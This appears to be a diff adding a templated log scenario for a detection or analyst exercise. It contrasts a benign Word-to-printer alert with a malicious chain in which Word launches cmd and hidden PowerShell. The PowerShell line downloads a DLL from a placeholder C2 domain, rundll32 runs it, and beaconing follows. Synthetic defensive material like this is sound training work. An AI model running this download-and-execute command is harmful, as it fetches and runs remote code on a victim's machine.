@@ -1,0 +1,16 @@
+# Invoice Season (offsets from {{T0}}, when the document was opened)
+# the harmless one: printing from Word
+-50m host={{GOODH}} source=proclog event=1 user={{GOODU}} image="C:\Program Files\Office\winword.exe" parent=C:\Windows\explorer.exe cmdline="winword.exe C:\Users\{{GOODU}}\Documents\{{GOODDOC}}"
+-47m host={{GOODH}} source=proclog event=1 user={{GOODU}} image=C:\Windows\splwow64.exe parent="C:\Program Files\Office\winword.exe" cmdline="splwow64.exe 8192"
+-47m host={{GOODH}} source=alert severity=medium rule="Office program started another program" note="winword.exe started splwow64.exe on {{GOODH}}"
+-47m host=PRINT01 source=winsec event=5145 user={{GOODU}} share=\\PRINT01\Office-Printer src_ip={{GOODIP}} note="A shared printer was used"
+# the real one
+-1m host={{BADH}} source=proclog event=1 user={{BADU}} image="C:\Program Files\Office\outlook.exe" parent=C:\Windows\explorer.exe cmdline="outlook.exe"
++0 host={{BADH}} source=proclog event=1 user={{BADU}} image="C:\Program Files\Office\winword.exe" parent="C:\Program Files\Office\outlook.exe" cmdline="winword.exe C:\Users\{{BADU}}\Downloads\{{DOC}}"
++24s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\cmd.exe parent="C:\Program Files\Office\winword.exe" cmdline="cmd.exe /c powershell -w hidden -nop -c iwr http://{{C2DOM}}/s/{{DLL}} -OutFile $env:TEMP\{{DLL}}"
++24s host={{BADH}} source=alert severity=medium rule="Office program started another program" note="winword.exe started cmd.exe on {{BADH}}"
++25s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe parent=C:\Windows\System32\cmd.exe cmdline="powershell -w hidden -nop -c iwr http://{{C2DOM}}/s/{{DLL}} -OutFile $env:TEMP\{{DLL}}"
++26s host={{BADH}} source=dns query={{C2DOM}} type=A answer={{C2IP}} src_ip={{BADIP}}
++27s host=FW01 source=firewall action=allow direction=out src={{BADIP}} dst={{C2IP}} dport=80 proto=tcp bytes=184320
++40s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\rundll32.exe parent=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe cmdline="rundll32.exe C:\Users\{{BADU}}\AppData\Local\Temp\{{DLL}},Start"
++100s x8/60s host=FW01 source=firewall action=allow direction=out src={{BADIP}} dst={{C2IP}} dport=443 proto=tcp bytes=1460
